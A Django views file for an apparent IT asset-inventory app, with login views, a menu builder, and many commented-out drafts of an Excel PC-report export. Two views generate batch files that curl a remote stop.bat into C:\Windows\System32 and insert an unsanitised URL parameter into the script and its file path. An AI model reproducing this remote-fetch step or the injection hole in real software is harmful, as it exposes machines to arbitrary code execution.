from django.shortcuts import render, get_object_or_404, redirect
from django.http import HttpResponse

from django.http import JsonResponse
from django.views.decorators.http import require_GET
from .models import ShareFolderDetails,MainMenu
import os
import subprocess

from django.contrib.auth import authenticate
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

from django.http import JsonResponse


import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods







from django.shortcuts import render
from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
import os



from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_http_methods
import json







from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
import json

from django.http import JsonResponse, HttpResponseRedirect
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from django.shortcuts import render, get_object_or_404
from django.urls import reverse
import json
from .models import SystemInfo, Monitor, DisplaySetting, HistoryPC,Menu


from django.contrib import messages






from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages




from django.http import HttpResponse
from django.http import FileResponse
import os
from django.conf import settings


import requests
import os
import shutil
from django.http import HttpResponse






from django.shortcuts import render
from .models import Menu
from django.contrib.auth.decorators import login_required

def get_menu_context(request):
    # Get menu items that the current user is allowed to see
    menu_items = Menu.objects.filter(
        allowed_users=request.user
    ).select_related('parent').order_by('title')

    # Build a hierarchy of menu items
    menu_hierarchy = {}
    top_level_menus = []

    for item in menu_items:
        if not item.parent:  # Top-level menu
            menu_hierarchy[item.id] = {
                'item': item,
                'submenus': []
            }
            top_level_menus.append(item.id)
        else:  # Submenu
            if item.parent.id in menu_hierarchy:
                menu_hierarchy[item.parent.id]['submenus'].append(item)

    return {
        'menu_hierarchy': menu_hierarchy,
        'top_level_menus': top_level_menus
    }

# Example view using the menu
# @login_required
# def some_view(request):
#     context = get_menu_context(request)
#     # Add any additional context for this specific view
#     return render(request, 'your_template.html', context)






from django.http import JsonResponse
from .models import Product

def product_list(request):
    category = request.GET.get('category', None)
    min_price = request.GET.get('min_price', None)
    max_price = request.GET.get('max_price', None)

    products = Product.objects.all()

    if category:
        products = products.filter(category=category)

    if min_price and max_price:
        products = products.filter(price__gte=min_price, price__lte=max_price)

    data = list(products.values("id", "name", "category", "price", "stock"))  # Convert QuerySet to list of dictionaries
    return JsonResponse(data, safe=False)








def download_files(request,data):
    # Define base directory for temporary files
    base_dir = os.path.join(settings.MEDIA_ROOT, 'bat_files')
    os.makedirs(base_dir, exist_ok=True)
    serialnumber = data
    # Define file contents
    serial_content = f"""
    echo this is {serialnumber}
    curl -o "C:\Windows\System32\stop.bat" "https://arccit.pythonanywhere.com/it/f/download/stop.bat"
    timeout /t 55 /nobreak
    """
    schedule_content = f"ECHO Scheduled task for: {serialnumber}"

    # Define file paths
    serial_file = os.path.join(base_dir, f"{serialnumber}.bat")
    schedule_file = os.path.join(base_dir, "schedule.bat")

    # Create the bat files
    with open(serial_file, 'w') as f:
        f.write(serial_content)
    with open(schedule_file, 'w') as f:
        f.write(schedule_content)

    try:
        # First, serve serialnumber.bat
        if request.GET.get('file') != 'schedule':
            with open(serial_file, 'rb') as f:
                response = HttpResponse(f.read(), content_type="application/bat")
                response['Content-Disposition'] = f'attachment; filename="{serialnumber}.bat"'
                return response
        # Then, serve schedule.bat
        else:
            with open(schedule_file, 'rb') as f:
                response = HttpResponse(f.read(), content_type="application/bat")
                response['Content-Disposition'] = 'attachment; filename="schedule.bat"'
                return response
    except Exception as e:
        return HttpResponse(f"Error: {str(e)}", status=500)



def download_bat_files(request, serialnumber):
    # Define base directory for temporary files
    base_dir = os.path.join(settings.MEDIA_ROOT, 'bat_files')
    os.makedirs(base_dir, exist_ok=True)

    # Define file contents
    serial_content = f"""
    echo this is {serialnumber}
    curl -o "C:\Windows\System32\stop.bat" "https://arccit.pythonanywhere.com/it/f/download/stop.bat"
    timeout /t 55 /nobreak
    """
    schedule_content = f"ECHO Scheduled task for: {serialnumber}"

    # Define file paths
    serial_file = os.path.join(base_dir, f"{serialnumber}.bat")
    schedule_file = os.path.join(base_dir, "schedule.bat")

    # Create the bat files
    with open(serial_file, 'w') as f:
        f.write(serial_content)
    with open(schedule_file, 'w') as f:
        f.write(schedule_content)

    try:
        # First, serve serialnumber.bat
        if request.GET.get('file') != 'schedule':
            with open(serial_file, 'rb') as f:
                response = HttpResponse(f.read(), content_type="application/bat")
                response['Content-Disposition'] = f'attachment; filename="{serialnumber}.bat"'
                return response
        # Then, serve schedule.bat
        else:
            with open(schedule_file, 'rb') as f:
                response = HttpResponse(f.read(), content_type="application/bat")
                response['Content-Disposition'] = 'attachment; filename="schedule.bat"'
                return response
    except Exception as e:
        return HttpResponse(f"Error: {str(e)}", status=500)


def vbat_to_collect_data(request):
    file_path = os.path.join(settings.MEDIA_ROOT, 'bat_files/Arccit.bat')

    # Check if file exists
    if os.path.exists(file_path):
        response = FileResponse(open(file_path, 'rb'), as_attachment=True)
        return response
    else:
        return HttpResponse("File not found", status=404)


# Login View (Function-based)
def loginweb_view(request):
    template_name = 'it/login.html'

    if request.user.is_authenticated:
        return redirect('pc_details')  # Redirect to pc_details if already logged in

    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        remember_me = request.POST.get('remember')

        user = authenticate(request, username=username, password=password)

        if user is not None:
            login(request, user)
            # Set session expiry based on remember me
            if not remember_me:
                request.session.set_expiry(0)  # Expires when browser closes
            else:
                request.session.set_expiry(1209600)  # 2 weeks

            messages.success(request, f"Welcome back, {username}!")
            return redirect('nhome')  # Redirect to pc_details on successful login
        else:
            messages.error(request, "Invalid username or password.")
            return render(request, template_name)

    return render(request, template_name)

# Logout View (Function-based)
def logoutweb_view(request):
    logout(request)
    messages.success(request, "You have been successfully logged out.")
    return redirect('loginweb')




# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from datetime import datetime
# import io
# from django.http import HttpResponse
# # from sharefolder.models import SystemInfo, Monitor  # Updated to 'sharefolder'

# def download_pc_details_excel(request):
#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         monitor_model = system.monitors.first().monitor_model if system.monitors.exists() else ""
#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_model}"
#         )
#         data.append({
#             'computer_name': system.computer_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['computer_name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "MyTech Corp"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:C1')
#     ws.merge_cells('A2:C2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Add a watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:C3')
#     ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             ws.cell(row=r_idx, column=c_idx, value=value)

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header (corrected iteration)
#     for cell in ws[start_row]:  # Directly access the row at start_row
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20
#     ws.column_dimensions['B'].width = 20
#     ws.column_dimensions['C'].width = 60

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:C{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response



# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from datetime import datetime
# import io
# from django.http import HttpResponse
# # from sharefolder.models import SystemInfo, Monitor  # Updated to 'sharefolder'

# def download_pc_details_excel(request):
#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         # Get all monitor models and join them with a separator
#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:  # Handle case with no monitors
#             monitor_models = "None"
#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )
#         data.append({
#             'computer_name': system.computer_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['computer_name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "MyTech Corp"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:C1')
#     ws.merge_cells('A2:C2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Add a watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:C3')
#     ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             ws.cell(row=r_idx, column=c_idx, value=value)

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header
#     for cell in ws[start_row]:  # Directly access the row at start_row
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20
#     ws.column_dimensions['B'].width = 20
#     ws.column_dimensions['C'].width = 60

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:C{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response




# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from datetime import datetime
# import io
# from django.http import HttpResponse
# # from sharefolder.models import SystemInfo, Monitor  # Updated to 'sharefolder'

# def download_pc_details_excel(request):
#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         # Split computer_name by "-"
#         computer_name_parts = system.computer_name.split("-")

#         # Determine SiteName and Staff Name
#         if len(computer_name_parts) > 1:  # If there's a "-"
#             site_name = computer_name_parts[0].strip()  # First part
#             staff_name = computer_name_parts[-1].strip()  # Last part
#         else:  # If no "-"
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()  # Entire string

#         # Get all monitor models
#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame with updated columns
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "Arabian Coast"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header (adjusted for 4 columns)
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # # Add a watermark (adjusted for 4 columns)
#     # ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     # ws.merge_cells('B3:D3')  # Adjusted to span B3:D3
#     # ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     # ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             ws.cell(row=r_idx, column=c_idx, value=value)

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header
#     for cell in ws[start_row]:  # Directly access the row at start_row
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")

#     # Adjust column widths (updated for 4 columns)
#     ws.column_dimensions['A'].width = 20  # SiteName
#     ws.column_dimensions['B'].width = 20  # Staff Name
#     ws.column_dimensions['C'].width = 20  # model
#     ws.column_dimensions['D'].width = 60  # Description

#     # Add filters (adjusted for 4 columns)
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response


# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# # from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         # Split computer_name by "-"
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         # Get all monitor models
#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "MyTech Corp"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # # Add a watermark
#     # ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     # ws.merge_cells('B3:D3')
#     # ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     # ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             # Wrap text for Description column to fit better
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header
#     for cell in ws[start_row]:
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         # Set row height to accommodate wrapped text
#         ws.row_dimensions[row[0].row].height = 40  # Adjust height as needed

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20  # SiteName
#     ws.column_dimensions['B'].width = 20  # Staff Name
#     ws.column_dimensions['C'].width = 20  # model
#     ws.column_dimensions['D'].width = 60  # Description

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,  # A4 paper size (9 is the code for A4)
#         orientation='landscape',
#         fitToWidth=1,  # Fit to 1 page wide
#         fitToHeight=0  # Do not fit to height (allow pagination)
#     )

#     # Add footer
#     ws.oddFooter.center.text = "Page &[Page] of &[Pages]"  # Page number and total pages
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response



# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         # Split computer_name by "-"
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         # Get all monitor models
#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "MyTech Corp"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Add a watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:D3')
#     ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header
#     for cell in ws[start_row]:
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 40

#     # Adjust column widths
#     ws.column_dimensions['A'].width = 20  # SiteName
#     ws.column_dimensions['B'].width = 20  # Staff Name
#     ws.column_dimensions['C'].width = 20  # model
#     ws.column_dimensions['D'].width = 60  # Description

#     # Add filters
#     ws.auto_filter.ref = f"A{start_row}:D{start_row}"

#     # Freeze the header row
#     ws.freeze_panes = ws[f'A{start_row+1}']

#     # Set print options for A4 landscape
#     ws.page_setup = PrintPageSetup(
#         paperSize=9,  # A4
#         orientation='landscape',
#         fitToWidth=1,
#         fitToHeight=0
#     )

#     # Add footer with username
#     ws.oddFooter.center.text = f"Created by: {username} - Page &[Page] of &[Pages]"
#     ws.oddFooter.center.size = 10
#     ws.oddFooter.center.font = "Arial"

#     # Save to a BytesIO buffer
#     buffer = io.BytesIO()
#     wb.save(buffer)
#     buffer.seek(0)

#     # Create the HTTP response
#     response = HttpResponse(
#         buffer.getvalue(),
#         content_type='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
#     )
#     response['Content-Disposition'] = 'attachment; filename="pc_details_report.xlsx"'

#     return response
# import pandas as pd
# from openpyxl import Workbook
# from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
# from openpyxl.utils.dataframe import dataframe_to_rows
# from openpyxl.worksheet.page import PrintPageSetup
# from datetime import datetime
# import io
# from django.http import HttpResponse
# from sharefolder.models import SystemInfo, Monitor

# def download_pc_details_excel(request):
#     # Get the current username
#     username = request.user.username if request.user.is_authenticated else "Anonymous"

#     # Query all SystemInfo records
#     system_info_qs = SystemInfo.objects.all().prefetch_related('monitors')

#     # Prepare data
#     data = []
#     for system in system_info_qs:
#         # Split computer_name by "-"
#         computer_name_parts = system.computer_name.split("-")
#         if len(computer_name_parts) > 1:
#             site_name = computer_name_parts[0].strip()
#             staff_name = computer_name_parts[-1].strip()
#         else:
#             site_name = "None"
#             staff_name = computer_name_parts[0].strip()

#         # Get all monitor models
#         monitor_models = "; ".join(monitor.monitor_model for monitor in system.monitors.all())
#         if not monitor_models:
#             monitor_models = "None"

#         description = (
#             f"{system.processor}, {system.ram_gb} GB RAM, "
#             f"{system.graphics_card}, {system.storage}, {monitor_models}"
#         )

#         data.append({
#             'SiteName': site_name,
#             'Staff Name': staff_name,
#             'model': system.model,
#             'Description': description
#         })

#     # Create a DataFrame
#     df = pd.DataFrame(data, columns=['SiteName', 'Staff Name', 'model', 'Description'])

#     # Create a new workbook and worksheet
#     wb = Workbook()
#     ws = wb.active
#     ws.title = "PC Details Report"

#     # Add header information
#     company_name = "MyTech Corp"  # Customize this as needed
#     current_date = datetime.now().strftime("%Y-%m-%d")
#     ws.cell(row=1, column=1).value = f"PC Details Report - {company_name}"
#     ws.cell(row=2, column=1).value = f"Generated on: {current_date}"

#     # Merge cells for the header
#     ws.merge_cells('A1:D1')
#     ws.merge_cells('A2:D2')

#     # Style the header
#     header_font = Font(size=14, bold=True, color="FFFFFF")
#     header_fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")
#     ws['A1'].font = header_font
#     ws['A1'].fill = header_fill
#     ws['A1'].alignment = Alignment(horizontal="center", vertical="center")
#     ws['A2'].font = header_font
#     ws['A2'].fill = header_fill
#     ws['A2'].alignment = Alignment(horizontal="center", vertical="center")

#     # Add "CONFIDENTIAL" watermark
#     ws.cell(row=3, column=2).value = "CONFIDENTIAL"
#     ws.merge_cells('B3:D3')
#     ws['B3'].font = Font(size=20, color="D3D3D3", italic=True)
#     ws['B3'].alignment = Alignment(horizontal="center", vertical="center")

#     # Write DataFrame to sheet
#     start_row = 6
#     total_rows = len(df) + 1  # +1 for header
#     last_data_row = start_row + total_rows

#     for r_idx, row in enumerate(dataframe_to_rows(df, index=False, header=True), start_row):
#         for c_idx, value in enumerate(row, 1):
#             cell = ws.cell(row=r_idx, column=c_idx, value=value)
#             if c_idx == 4:  # Description column
#                 cell.alignment = Alignment(wrap_text=True, vertical="top")

#     # Apply styling to the table
#     thin_border = Border(left=Side(style='thin'), right=Side(style='thin'),
#                          top=Side(style='thin'), bottom=Side(style='thin'))
#     header_fill = PatternFill(start_color="DDEBF7", end_color="DDEBF7", fill_type="solid")
#     table_font = Font(bold=True, color="000000")

#     # Style the table header
#     for cell in ws[start_row]:
#         cell.fill = header_fill
#         cell.font = table_font
#         cell.border = thin_border
#         cell.alignment = Alignment(horizontal="center", vertical="center")

#     # Style the data rows
#     for row in ws[start_row+1:start_row+len(df)+1]:
#         for cell in row:
#             cell.border = thin_border
#             cell.alignment = Alignment(horizontal="left", vertical="center")
#         ws.row_dimensions[row[0].row].height = 40

#     # Add "Created by: [username]" as watermark-like text near the bottom-right
